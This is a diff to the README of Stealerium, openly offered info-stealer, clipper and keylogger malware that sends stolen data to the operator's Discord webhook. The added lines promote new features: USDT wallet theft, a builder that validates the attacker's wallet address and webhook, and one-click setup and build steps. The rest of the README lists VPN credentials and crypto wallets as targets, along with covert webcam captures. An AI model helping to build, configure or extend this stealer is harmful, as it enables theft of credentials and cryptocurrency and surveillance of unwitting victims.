@@ -1,7 +1,8 @@
 <p align="center">
   <img src="https://user-images.githubusercontent.com/73314940/165982277-b00ac8cc-dbb1-407b-a247-8e752fcc8ae1.png"> <br>
   <b>Stealer + Clipper + Keylogger</b> <br>
-  <i>Stealer written on C#, logs will be sent to your Discord channel using a webhook.</i>
+  <i>Stealer written on C#, logs will be sent to your Discord channel using a webhook.</i> <br>
+  <b>🔥 Updated by <a href="https://github.com/chocolaid">@chocolaid</a> </b>
 </p>
 
 [![Build Stealerium](https://github.com/Stealerium/Stealerium/actions/workflows/dotnet.yml/badge.svg)](https://github.com/Stealerium/Stealerium/actions/workflows/dotnet.yml)
@@ -27,7 +28,7 @@
 - [x] ProtonVPN, OpenVPN, NordVPN
 - [x] Crypto Wallets
     > Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum,
-    > AtomicWallet, Guarda, Coinomi, Litecoin, Dash, Bitcoin
+    > AtomicWallet, Guarda, Coinomi, Litecoin, Dash, Bitcoin, **USDT (Tether)**
 - [x] Crypto Wallet Extensions from Chrome & Edge
     > Binance, coin98, Phantom, Mobox, XinPay, Math10, Metamask, BitApp,
     > Guildwallet, iconx, Sollet, Slope Wallet, Starcoin, Swash, Finnie,
@@ -51,6 +52,22 @@
 * **:camera: Webcam screenshots:**
   * Webcam screenshots will be taken if the user is watching something obscene on the Internet.
 
+# 🚀 New Features (by @chocolaid):
+* **:gear: Smart Builder CLI:**
+  * Settings persistence - remembers your last inputs as placeholders
+  * Wallet address validation with attitude-filled error messages
+  * Enhanced Discord webhook validation with comprehensive pattern matching
+  * Support for all major cryptocurrencies (BTC, ETH, LTC, USDT)
+* **:wrench: Automated Setup:**
+  * `setup.bat` - One-click project setup with dependency checking
+  * `builder.bat` - Quick launcher for the builder
+  * .NET 6.0+ runtime verification
+  * MSBuild detection and configuration
+  * NuGet package restoration
+* **:shield: Enhanced Security:**
+  * New webhook validation beyond basic type checking
+  * Comprehensive error handling and user feedback
+
 # :hammer: Builder:
 <p align="center">
   <img src="https://user-images.githubusercontent.com/73314940/165985151-6f74dd66-c9d8-4063-a3e2-fe80d4a4f34a.png">
@@ -67,8 +84,43 @@ If you want to build from the source these are the requirements.
  - [NET SDK 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0) (included in Visual Studio 2022)
  - [NET Framework SDK 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48) (included in Visual Studio 2022)
 
- # Runtime requirements.
- Only needed if u download the release from [Releases](https://github.com/Stealerium/Stealerium/releases) (stealerium.zip)
- - Builder.exe ([NET Runtime 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0))
- - Stub ([NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48))
+# 🚀 Quick Start (Enhanced Setup):
+1. **Clone the repository:**
+   ```bash
+   git clone https://github.com/Stealerium/Stealerium.git
+   cd Stealerium
+   ```
+
+2. **Run the automated setup:**
+   ```bash
+   ./setup.bat
+   ```
+   This will automatically:
+   - Check .NET 6.0+ runtime installation
+   - Detect and configure MSBuild
+   - Restore NuGet packages
+   - Build the entire solution
+   - Verify output binaries
+
+3. **Launch the builder:**
+   ```bash
+   ./builder.bat
+   ```
+
+# Runtime requirements.
+Only needed if u download the release from [Releases](https://github.com/Stealerium/Stealerium/releases) (stealerium.zip)
+- Builder.exe ([NET Runtime 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0))
+- Stub ([NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48))
+
+# 🔧 Manual Build (if automated setup fails):
+```bash
+# Restore packages
+nuget restore Stealerium.sln
+
+# Build with MSBuild
+msbuild Stealerium.sln /p:Configuration=Release /p:Platform="Any CPU"
+
+# Or build with dotnet
+dotnet build Stealerium.sln --configuration Release
+```
 x
